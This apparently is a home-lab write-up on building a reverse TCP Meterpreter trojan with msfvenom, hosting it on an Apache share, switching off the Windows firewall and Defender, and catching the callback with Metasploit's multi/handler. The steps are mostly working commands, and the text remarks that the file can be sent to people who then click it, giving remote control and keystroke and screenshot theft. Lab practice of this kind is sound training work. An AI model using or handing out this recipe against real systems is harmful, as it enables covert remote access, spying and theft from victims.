# Ethical Hacking 3 - Prepping To Hack Into Windows VM

<h2>Description:</h2>

In Ethical Hacking 3 - Remote Hacking Windows VM Part 1, I will embark on an immersive journey into the realm of ethical hacking. This hands-on lesson will guide me in utilizing Metasploit within Kali Linux to create a Trojan malware, specifically a reverse TCP Trojan executable containing Meterpreter. I will gain insights into the capabilities of Trojan malware, including its ability to steal screenshots and keystrokes. Furthermore, this lesson will cover the creation of a web-sharable and executable folder, enabling me to initiate hacks from a Kali Linux VM into a Windows VM. I will also learn how to effectively listen with Kali Linux while executing these hacking techniques on a Windows VM, providing me with a foundational understanding of remote hacking methodologies.



<h2>Environment Used</h2>

- Kali Linux and Windows VM : 
  - Network Attached to: NAT Network
  - Name: PublicNAT
  - IP Address = 10.0.9 Network
 
- Tool Used: Metasploit from Kali Linux
 
<h2></h2>

<h2>Launching Metasploit on Kali Linux VM</h2>

1. Open up Kali Linux on the Oracle VM Application

2. Click on the top left corner of the VM for application > Scroll down to 8. Exploitation Tools > Metasploit framework

3. Creating a Reverse TCP Trojan executable containing Meterpreter:
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your Kali Linux IP Address] -f exe -o ~/Desktop/["Name".exe]
      - -p = payload
      - windows/meterpreter/reverse_tcp = can just send people this file and if they click on it then it will give us a reverse TCP connection
      - LHOST = Local Host Address; Kali Linux IP Address
      - -f exe = format of an executable file
      - -o ~/Desktop/"name".exe = output; ~/Desktop = saving on desktop on Kali Linux; /"name".exe = naming the program
    - Metasploit framework Venom is a payload creation tool
      - Allows to embed a payload called Meterpreter
      - Meterpreter = tool that gives remote shell/ complete control over a remote computer

4. Msfvenom Payload and Payload successfully created on the Desktop of Kali Linux:
    - >msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.9.4 -f exe -o ~/Desktop/Diablo5.exe

<h2></h2>

<h2>Sharing the Payload over the internet</h2>

1. Create a web sharable and executable folder named "share"
    - In the Metasploit Framework application type in:
      - sudo mkdir /var/www/html/share
        - This creates a folder
      - sudo cp ~/Desktop/[createdTrojan] /var/www/html/share
        - This copies the Trojan to the folder we just created
      - sudo service apache2 start
        - This starts the Apache web server on the Kali Linux

2. Can check if the Apache Web server is running or not by
    - Type in Firefox browser: localhost/share

<h2></h2>

<h2>Prep Windows VM to be Hackable</h2>

- Check if the Setting of the VM to enable USB Controller
- Run CMD.exe as Administrator and turn off Virus & Threat Protection:
  - In cmd: >netsh advfirewall set allprofiles state off
  - In Virus & Threat Protection > Manage settings > Turn off Real-time protection, cloud-delivered protection, Automatic sample submission, and Temper Protection

<h2></h2>

<h2>Infect Windows VM with the Trojan Virus</h2>

1. Setup on Kali Linux to listen for the infected PC:
    - on the Kali Linux Metasploit Framework type:
      - >use exploit/multi/handler
        - Tool inside Metasploit allows us to listen for or handle different virus payloads calling back into Kali Linux
      - >set PAYLOAD windows/meterpreter/reverse_tcp
        - set the payload to match Windows reverse TCP
      - >show options
        - see what option we have here; need to set a Localhost [IP for Kali Linux]
      - >set LHOST 10.0.9.4
        - set our localhost to be 10.0.9.4
      - >exploit
        - run the exploit

2. Go back to the Windows VM to surf to the Kali Linux IP Address on Browser
    - On the Browser URL type in Kali Linux's IP address with the share folder [10.0.9.4]
      - >10.0.9.4/share

3. Download the Diablo5.exe and run it

4. Kali Linux VM will start listening and is capable of running commands remotely through the interpreter shell
